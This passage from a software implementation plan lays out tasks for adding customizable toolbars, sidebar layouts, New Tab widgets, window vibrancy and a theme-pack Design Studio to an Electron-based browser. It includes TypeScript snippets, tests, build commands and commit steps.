          click: () => {
            sendToMainWindow('shortcut', 'reset-appearance-default');
          }
        },
```
And near `'set-theme'` (line 4297):
```ts
ipcMain.on('set-window-material', (event, material: 'opaque' | 'glass-vibrancy') => {
  if (!isTrustedSender(event)) return;
  if (material !== 'opaque' && material !== 'glass-vibrancy') return;
  if (!mainWindow || mainWindow.isDestroyed()) return;
  try {
    if (process.platform === 'darwin') {
      if (material === 'glass-vibrancy') {
        mainWindow.setBackgroundColor('#00000000');
        mainWindow.setVibrancy('under-window');
      } else {
        mainWindow.setVibrancy(null);
        mainWindow.setBackgroundColor(nativeTheme.shouldUseDarkColors ? '#0f172a' : '#f8fafc');
      }
    } else if (process.platform === 'win32' && typeof (mainWindow as any).setBackgroundMaterial === 'function') {
      (mainWindow as any).setBackgroundMaterial(material === 'glass-vibrancy' ? 'acrylic' : 'none');
    }
  } catch {
    // Platform or OS compositor unsupported; renderer CSS backdrop fallback handles translucency cleanly.
  }
});
```
In `electron/preload.ts`:
```ts
  setWindowMaterial: (material: 'opaque' | 'glass-vibrancy') => ipcRenderer.send('set-window-material', material),
```
Update TypeScript `ElectronAPI` interface where `setTheme` is declared.

- [ ] **Step 3: Build Electron & verify runtime contract tests**

Run: `npm run build:electron && npx esbuild tests/main_process_runtime_verification.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/main_runtime.cjs && node dist-test/main_runtime.cjs`  
Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add electron/main.ts electron/preload.ts src/
git commit -m "feat(electron): add window vibrancy IPC and Customize menu accelerators"
```

---

### Task 7: Modular Toolbar Slot Helpers & Item Registry

**Files:**
- Create: `src/utils/toolbarSlots.ts`
- Create: `src/components/customization/toolbarRegistry.tsx`
- Test: `tests/toolbar_customization.test.ts`

**Interfaces:**
- Consumes: `ToolbarSlotItem`, `ToolbarItemKind` (`src/types/browser.ts`), `ALLOWED_TOOLBAR_KINDS`, `TOOLBAR_ITEM_ORDER_DEFAULT` (`src/utils/designDefaults.ts`)
- Produces: Pure list operations (`reorderToolbarItems`, `toggleToolbarItemVisibility`, `removeToolbarItem`, `insertToolbarItem`, `getPaletteToolbarItems`), and metadata registry (`TOOLBAR_ITEM_META`, `ToolbarItemSpec`).

- [ ] **Step 1: Write failing tests for toolbar reordering, hiding, removal to palette, and multiple spacer insertion**

```ts
// tests/toolbar_customization.test.ts
import assert from 'node:assert/strict';
import {
  reorderToolbarItems,
  toggleToolbarItemVisibility,
  removeToolbarItem,
  insertToolbarItem,
  getPaletteToolbarItems,
} from '../src/utils/toolbarSlots';
import { TOOLBAR_ITEM_ORDER_DEFAULT } from '../src/utils/designDefaults';

const items = [...TOOLBAR_ITEM_ORDER_DEFAULT];

// 1. Reorder: move 'slot-ai' to index 0
const reordered = reorderToolbarItems(items, 'slot-ai', 'slot-back');
assert.equal(reordered[0].kind, 'ai');

// 2. Toggle visibility (keep slot in place with visible: false)
const hidden = toggleToolbarItemVisibility(reordered, 'slot-home');
assert.equal(hidden.find(i => i.id === 'slot-home')?.visible, false);

// 3. Remove item to palette
const removed = removeToolbarItem(hidden, 'slot-downloads');
assert.ok(!removed.some(i => i.id === 'slot-downloads'));

// 4. Palette reports unused singletons + always includes spacer and divider
const palette = getPaletteToolbarItems(removed);
assert.ok(palette.includes('downloads'));
assert.ok(palette.includes('spacer'));
assert.ok(palette.includes('divider'));

// 5. Insert multiple spacers independently with unique ids
const withSpacer1 = insertToolbarItem(removed, 'spacer', 2, 100);
const withSpacer2 = insertToolbarItem(withSpacer1, 'spacer', 5, 101);
const spacers = withSpacer2.filter(i => i.kind === 'spacer');
assert.equal(spacers.length, 2);
assert.notEqual(spacers[0].id, spacers[1].id);
console.log('toolbar_customization.test.ts passed');
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx esbuild tests/toolbar_customization.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/toolbar_cust.cjs && node dist-test/toolbar_cust.cjs`  
Expected: FAIL (`Could not resolve "../src/utils/toolbarSlots"`).

- [ ] **Step 3: Implement `src/utils/toolbarSlots.ts` and `src/components/customization/toolbarRegistry.tsx`**

Implement `src/utils/toolbarSlots.ts`:
```ts
import type { ToolbarItemKind, ToolbarSlotItem } from '../types/browser';
import { ALLOWED_TOOLBAR_KINDS } from './designDefaults';

const REPEATABLE_KINDS: ReadonlySet<ToolbarItemKind> = new Set(['spacer', 'divider']);

export function reorderToolbarItems(
  items: ToolbarSlotItem[],
  draggedId: string,
  targetId: string
): ToolbarSlotItem[] {
  if (draggedId === targetId) return items;
  const fromIdx = items.findIndex(i => i.id === draggedId);
  const toIdx = items.findIndex(i => i.id === targetId);
  if (fromIdx === -1 || toIdx === -1) return items;
  const next = [...items];
  const [moved] = next.splice(fromIdx, 1);
  next.splice(toIdx, 0, moved);
  return next;
}

export function moveToolbarItemToIndex(
  items: ToolbarSlotItem[],
  draggedId: string,
  targetIndex: number
): ToolbarSlotItem[] {
  const fromIdx = items.findIndex(i => i.id === draggedId);
  if (fromIdx === -1) return items;
  const next = [...items];
  const [moved] = next.splice(fromIdx, 1);
  const clamped = Math.max(0, Math.min(next.length, targetIndex));
  next.splice(clamped, 0, moved);
  return next;
}

export function toggleToolbarItemVisibility(items: ToolbarSlotItem[], id: string): ToolbarSlotItem[] {
  return items.map(item => (item.id === id ? { ...item, visible: !item.visible } : item));
}

export function removeToolbarItem(items: ToolbarSlotItem[], id: string): ToolbarSlotItem[] {
  return items.filter(item => item.id !== id);
}

export function insertToolbarItem(
  items: ToolbarSlotItem[],
  kind: ToolbarItemKind,
  atIndex?: number,
  nonce: number = Date.now()
): ToolbarSlotItem[] {
  if (!REPEATABLE_KINDS.has(kind) && items.some(i => i.kind === kind)) {
    return items;
  }
  const newItem: ToolbarSlotItem = {
    id: `slot-${kind}-${nonce.toString(36)}`,
    kind,
    visible: true,
  };
  const next = [...items];
  const insertAt = atIndex === undefined ? next.length : Math.max(0, Math.min(next.length, atIndex));
  next.splice(insertAt, 0, newItem);
  return next;
}

export function getPaletteToolbarItems(activeItems: ToolbarSlotItem[]): ToolbarItemKind[] {
  const presentKinds = new Set(activeItems.map(i => i.kind));
  return ALLOWED_TOOLBAR_KINDS.filter(kind => REPEATABLE_KINDS.has(kind) || !presentKinds.has(kind));
}
```

Implement `src/components/customization/toolbarRegistry.tsx` providing metadata (`label`, `category`: `'navigation' | 'address' | 'actions' | 'layout'`, `icon`, `isCritical`) and a wrapper component `CustomizeSlotWrapper` that renders drag handle, Eye (hide/show), and X (remove) chrome pills cleanly over any toolbar slot only when `isCustomizeMode` is true.

- [ ] **Step 4: Run tests & typecheck**

Run: `npx esbuild tests/toolbar_customization.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/toolbar_cust.cjs && node dist-test/toolbar_cust.cjs && npx tsc --noEmit`  
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/utils/toolbarSlots.ts src/components/customization/toolbarRegistry.tsx tests/toolbar_customization.test.ts
git commit -m "feat(toolbar): implement modular toolbar slot operations and item registry"
```

---

### Task 8: Modular Slot Rendering, `tabBarPosition` & Compact Single-Row Mode in `TopBar.tsx`

**Files:**
- Modify: `src/components/TopBar.tsx:100-170, 720-775, 1175-1860, 1960-2000` (memo comparator!)
- Test: verify `tests/navigation_controls_regressions.test.ts` and `npx tsc --noEmit`

**Interfaces:**
- Consumes: `ResolvedBrowserDesign` (`src/utils/designEngine.ts`), `CustomizeSlotWrapper` (`src/components/customization/toolbarRegistry.tsx`), `ToolbarSlotItem` (`src/types/browser.ts`)
- Produces: Dynamic slot-ordered Row 2 toolbar in `TopBar`, swappable Row 1 / Row 2 (`tabBarPosition: 'below-toolbar'`), and unified `compact-single-row` bar rendering workspaces + tabs + toolbar slots cleanly alongside macOS `88px` and Windows `140px` drag spacers.

- [ ] **Step 1: Extend `TopBarProps` & memo comparator**

Add optional props to `TopBarProps`:
- `design?: ResolvedBrowserDesign`
- `isCustomizeMode?: boolean`
- `onReorderToolbarSlot?: (draggedId: string, targetId: string) => void`
- `onInsertToolbarSlot?: (kind: ToolbarItemKind, atIndex: number) => void`
- `onToggleToolbarSlotVisibility?: (id: string) => void`
- `onRemoveToolbarSlot?: (id: string) => void`
- `onOpenCustomizeMode?: () => void`
- Callbacks for newly exposed modular items (`bookmarksToggle`, `splitView`, `pip`, `screenshot`).
Update custom `React.memo` comparator (`L1960-2000`) to compare `design` and `isCustomizeMode` (`prevProps.design !== nextProps.design || prevProps.isCustomizeMode !== nextProps.isCustomizeMode`).

- [ ] **Step 2: Implement `renderToolbarItem(slot: ToolbarSlotItem, idx: number)` + drop slots + layout modes**

Replace hardcoded Row 2 JSX in `TopBar.tsx` with `slots.map((slot, idx) => ...)` using `toolbarItems` (filtering `!slot.visible` when `!isCustomizeMode`, rendering dimmed with Eye-off badge when `isCustomizeMode`), wrapped in `CustomizeSlotWrapper` when editing is active. Allow dragging either an existing `slot-id` OR a `palette-kind` from `DesignStudioDrawer` via `dataTransfer.setData('application/x-nova-toolbar-slot' | 'application/x-nova-toolbar-kind', ...)`.

Implement:
- `classic-top` with `tabBarPosition === 'above-toolbar'` vs `'below-toolbar'` (reordering Row 1 and Row 2 blocks cleanly; moving `isMac` / `isWindows` drag spacers onto the top-most rendered row!).
- `compact-single-row`: single `flex items-center` top row combining macOS/Windows drag spacer -> tab strip (`min-w-[180px] flex-[1.2]`) -> modular toolbar slots (omnibox compact + action slots) + `More Menu`.

- [ ] **Step 3: Add right-click context trigger on TopBar background (`Customize Browser...`) and run typecheck + navigation tests**

Run: `npx esbuild tests/navigation_controls_regressions.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/nav_ctrl.cjs && node dist-test/nav_ctrl.cjs && npx tsc --noEmit`  
Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add src/components/TopBar.tsx
git commit -m "feat(topbar): render modular toolbar slots, tabBarPosition, and compact single-row mode"
```

---

### Task 9: Resizable/Toggleable `SidebarTabs` & `App.tsx` Multi-Shell Positioning (`vertical-left` / `vertical-right`) + Emergency Shortcuts

**Files:**
- Modify: `src/components/SidebarTabs.tsx:145-195, 530-585, 987-1090, 1570-1660`
- Modify: `src/App.tsx:270-310, 1180-1405, 1445-1740`
- Test: `tests/vertical_tabs.test.ts`, `tests/sidebar_tabs_ui.test.ts`

**Interfaces:**
- Consumes: `ResolvedBrowserDesign`, `chromeMode`, `sidebarWidth`, `sidebarSections`
- Produces: Left or right flex-ordered sidebar in `App.tsx`, interactive drag-resizer handle (`200-360px` persisted back to `designProfile.layout.sidebarWidth`), macOS top-left traffic light spacer adjustment when `chromeMode === 'vertical-right'`, `Shift+CmdOrCtrl+0` safe reset handler positioned BEFORE zoom reset in `App.tsx` line 1349, `Shift+CmdOrCtrl+E` customize toggle.

- [ ] **Step 1: Extend `SidebarTabsProps` & conditional section rendering**

Pass `sidebarWidth` (`style={{ width: `${sidebarWidth}px` }}`), `sidebarPosition: 'left' | 'right'`, `sidebarSections`, and `isCustomizeMode` into `SidebarTabs.tsx`. Conditionally render `favorites`, `pinned`, `folders`, `workspaces`, and `dockFooter` per `sidebarSections` (or show dimmed toggle card in Customize Mode). When `sidebarPosition === 'right'`, move macOS traffic-light left spacer (`w-[72px]`) out of the sidebar header onto the top-left main content drag header so traffic lights never collide!

- [ ] **Step 2: Wire `App.tsx` shell placement, resize drag handle, Customize `<webview>` shield, and keyboard shortcuts**

In `src/App.tsx`:
- Compute `effectiveDesign = resolveEffectiveDesign(settings, activeWorkspaceId, Boolean(activeTab?.isIncognito))` (using draft profile when Customize Mode is open).
- Compute `useVerticalTabs` from `effectiveDesign.layout.chromeMode === 'vertical-left' || effectiveDesign.layout.chromeMode === 'vertical-right'`.
- Render vertical sidebar before or after the main content column (`sidebarSide = chromeMode === 'vertical-right' ? 'right' : 'left'`), plus a 4px interactive border resizer dragging `200..360` px.
- Add `Shift+CmdOrCtrl+0` handler BEFORE `if (meta && key === '0')` to confirm and restore `createDefaultDesignProfile()` + `workspaceDesigns: {}`.
- Add `Shift+CmdOrCtrl+E` handler + Electron IPC `'toggle-customize-mode'` & `'reset-appearance-default'` listener.
- Render pointer/drag shield over `#browser-views-container` whenever `isCustomizeMode` is true (unless `activeTab` is `nova://newtab`, allowing interactive New Tab widget customization!).

- [ ] **Step 3: Run vertical tabs & sidebar tests + typecheck**

Run: `npm run test:sidebar && npx esbuild tests/vertical_tabs.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/vtabs.cjs && node dist-test/vtabs.cjs && npx tsc --noEmit`  
Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add src/components/SidebarTabs.tsx src/App.tsx
git commit -m "feat(layout): support left/right resizable sidebar, multi-shell modes, and emergency reset shortcut"
```

---

### Task 10: Modular Widget Layout in `NewTabPage.tsx`

**Files:**
- Modify: `src/components/NewTabPage.tsx:35-85, 110-160, 1110-1360`
- Modify: `src/components/BrowserView.tsx:180-215, 1210-1240` (forward `newTabLayout` & `isCustomizeMode` into `NewTabPage`)
- Test: `tests/newtab_wallpaper_contrast.test.ts`

**Interfaces:**
- Consumes: `NewTabLayoutConfig` (`src/types/browser.ts`), `DEFAULT_DESIGN_PROFILE.newTabLayout` (`src/utils/designDefaults.ts`)
- Produces: Modular New Tab widgets responding dynamically to `clock`, `greeting`, `searchBox`, `shortcuts` (4-8 columns, 4 card styles), and `tasksWidget` (`bottom`, `left`, `right`, `floating`), plus inline widget highlight overlays when `isCustomizeMode` is active.

- [ ] **Step 1: Add `newTabLayout` & `isCustomizeMode` props cleanly through `BrowserView.tsx` into `NewTabPage.tsx`**

Update `BrowserView` memo check to include `prev.newTabLayout !== next.newTabLayout` and `prev.isCustomizeMode !== next.isCustomizeMode`.

- [ ] **Step 2: Render modular New Tab widgets based on `newTabLayout`**

- `Clock`: switch visibility (`newTabLayout.clock.visible`), `12h` vs `24h` formatter, 4 style treatments (`minimal`, `editorial`, `mono`, `pill`), alignment (`center` vs `left`).
- `Greeting`: show `newTabLayout.greeting.customText?.trim()` when present, fallback to translated greeting, or hide if `visible === false`.
- `SearchBox`: switch width (`narrow`: `max-w-[440px]`, `medium`: `max-w-[560px]`, `wide`: `max-w-[740px]`), visual styles (`glass`, `solid`, `minimal`, `pill`), or hide.
- `Shortcuts`: dynamic Tailwind grid columns mapping (`4` -> `grid-cols-4`, up to `8` -> `grid-cols-8` responsive) and 4 card styles (`tile`, `pill`, `icon-only`, `compact`), or hide.
- `TasksWidget`: position wrapper (`bottom`: centered below shortcuts, `left`/`right`: fixed-to-side dock container, `floating`: bottom-right floating corner panel).
- When `isCustomizeMode` is true, each widget renders a subtle dashed customize outline + hover quick-toggle pill (`Hide` / cycle style) invoking callback directly on `CustomizeContext`.

- [ ] **Step 3: Run New Tab contrast test & typecheck**

Run: `npx esbuild tests/newtab_wallpaper_contrast.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/nt_contrast.cjs && node dist-test/nt_contrast.cjs && npx tsc --noEmit`  
Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add src/components/NewTabPage.tsx src/components/BrowserView.tsx
git commit -m "feat(newtab): make clock, greeting, search box, shortcuts, and tasks widgets customizable"
```

---

### Task 11: Live `CustomizeContext`, 5-Tab `DesignStudioDrawer`, Settings & Backup Integration

**Files:**
- Create: `src/components/customization/CustomizeContext.tsx`
- Create: `src/components/customization/CustomizeTopBanner.tsx`
- Create: `src/components/customization/DesignStudioDrawer.tsx`
- Modify: `src/components/settings/AppearanceSection.tsx`
- Modify: `src/hooks/useAppDataBackup.ts:109-145`
- Modify: `src/App.tsx` (wrap chrome in `CustomizeProvider`, mount `CustomizeTopBanner` & `DesignStudioDrawer`)
- Test: `tests/data_backup_sanitization.test.ts`, full `npm test`, `npm run build`

**Interfaces:**
- Consumes: `STARTER_DESIGN_TEMPLATES` (`src/utils/designTemplates.ts`), `sanitizeDesignProfile`, `sanitizePartialDesignProfile`, `sanitizeCustomCss`, `exportThemePack`, `importThemePack` (`src/utils/designSecurity.ts`), `toolbarSlots.ts`, `ToolbarItemKind`
- Produces: Live draft state (`draftProfile`, `editingScope`, `undo()`, `commit()`, `discard()`, `resetToDefault()`, `applyStarterTemplate()`, `importPack()`, `exportPack()`), dockable/draggable 5-tab `DesignStudioDrawer`, sanitized `designProfile` & `workspaceDesigns` backup import in `useAppDataBackup.ts`.

- [ ] **Step 1: Add `.novatheme.json` & backup sanitization test assertions in `tests/data_backup_sanitization.test.ts`**

Verify `sanitizeDesignProfile` and `sanitizePartialDesignProfile` sanitize nested `designProfile` and `workspaceDesigns` imported from backup JSON without leaking prototype properties.

- [ ] **Step 2: Create `CustomizeContext.tsx`, `CustomizeTopBanner.tsx`, and 5-tab `DesignStudioDrawer.tsx`**

- `CustomizeContext.tsx`: manages `isCustomizeMode`, `editingScope: 'global' | 'workspace'`, `draftProfile`, single-level/multi-step undo stack, `updateDraft(...)`, `commit()` (writes to `settings.designProfile` or `settings.workspaceDesigns[activeWorkspaceId]` and syncs legacy `useVerticalTabs` / `showTasksWidget` flags), `discard()`, `resetToDefault()`.
- `CustomizeTopBanner.tsx`: top translucent banner anchored above `<webview>` with Scope selector (`Global Design` vs `Workspace: <name>`), `Undo`, `Reset to Default`, `Cancel`, and `Save & Exit` CTA.
- `DesignStudioDrawer.tsx`: movable / left-right dockable `380px` glass drawer (`z-[995]`, above webview shield):
  1. **Templates & Packs Tab**: grid of 6 visual starter template cards, Workspace Override toggle ("Use custom design for [Workspace Name]" + Clear Override), `.novatheme.json` Export button (triggers file download) and Import file input (runs `importThemePack` + displays validation feedback).
  2. **Layout & Toolbar Tab**: `chromeMode` cards (`classic-top`, `compact-single-row`, `vertical-left`, `vertical-right`), `tabBarPosition` switch, `sidebarWidth` slider (`200–360px`), sidebar section checkboxes, and **Draggable / Clickable Toolbar Palette** showing unused items plus repeatable `+ Spacer` and `+ Divider`.
  3. **Zones & Surfaces Tab**: horizontal pill selector for all 9 `SurfaceZoneId` regions -> Background color/gradient input + color swatch, Text & Muted colors, Opacity slider (`20–100%`), Blur slider (`0–32px`), Border width (`0–2px`) + color, Corner radius (`0–24px`), Shadow dropdown (`none`/`soft`/`elevated`/`glow`), Clear Zone Override button.
  4. **Typography & Effects Tab**: UI Font Family cards, UI Scale (`85–125%`) & Icon Scale (`85–125%`) sliders, Density (`compact`/`normal`/`comfortable`), Tab Style & Animation controls, Native Window Material (`opaque` vs `glass-vibrancy`).
  5. **New Tab & CSS Tab**: Toggle/style controls for Clock, Greeting, Search Box, Shortcuts columns/cardStyle, Tasks Widget placement + Sanitized Custom CSS textarea with Enable switch and live `sanitizeCustomCss` warning banner.

- [ ] **Step 3: Wire `AppearanceSection.tsx`, `useAppDataBackup.ts`, and `App.tsx`**

- Add prominent **"Open Live Design Studio (`Cmd/Ctrl+Shift+E`)"** card at top of `AppearanceSection.tsx`, quick starter template selector, Import/Export `.novatheme.json`, and **"Reset All Customizations"** button.
- Update `useAppDataBackup.ts` (`handleImportData`) to sanitize `raw.designProfile` via `sanitizeDesignProfile` and each key/entry in `raw.workspaceDesigns` via `sanitizePartialDesignProfile` (skipping `__proto__`, `constructor`, `prototype`).
- Mount `CustomizeProvider`, `CustomizeTopBanner`, and `DesignStudioDrawer` in `App.tsx`.

- [ ] **Step 4: Run complete verification suite**

Run:
- `npx tsc --noEmit`
- `npm run build`
- `npm test`
- `npx esbuild tests/design_defaults.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/design_defaults.cjs && node dist-test/design_defaults.cjs`
- `npx esbuild tests/design_customization_security.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/design_sec.cjs && node dist-test/design_sec.cjs`
- `npx esbuild tests/design_engine.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/design_engine.cjs && node dist-test/design_engine.cjs`
- `npx esbuild tests/toolbar_customization.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/toolbar_cust.cjs && node dist-test/toolbar_cust.cjs`
(Also wire the 4 new test files into `tests/runAll.ts` so `npm test` always runs them automatically!)
- Run `graphify update .` to update the repository knowledge graph.

- [ ] **Step 5: Commit**

```bash
git add src/components/customization/ src/components/settings/AppearanceSection.tsx src/hooks/useAppDataBackup.ts src/App.tsx tests/
git commit -m "feat(customization): launch Live Design Studio, theme packs, and backup validation"
```
